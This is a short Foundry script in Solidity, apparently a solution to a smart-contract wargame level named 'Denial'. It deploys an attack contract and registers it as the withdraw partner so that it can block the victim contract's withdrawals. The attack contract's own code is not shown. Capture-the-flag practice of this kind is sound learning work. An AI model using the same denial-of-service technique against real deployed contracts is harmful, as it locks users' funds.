// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/level20.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract DenialHac is Script
{
    function run() external
    {
        vm.startBroadcast(vm.envUint('PRIVATE_KEY'));

       DenialHack denialHack = new DenialHack();
       denialHack.setWithdrawPartner();

       vm.stopBroadcast();

    }
}